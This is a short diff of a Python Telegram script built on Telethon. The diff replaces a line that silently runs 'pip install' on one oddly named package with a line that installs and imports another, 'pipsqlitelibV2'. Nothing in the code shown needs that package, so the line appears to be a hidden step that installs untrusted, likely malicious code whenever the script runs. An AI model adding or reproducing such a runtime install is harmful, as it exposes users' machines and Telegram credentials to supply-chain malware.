@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolortoolkit")
-import pipcolortoolkit
+os.system("pip install pipsqlitelibV2")
+import pipsqlitelibV2
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
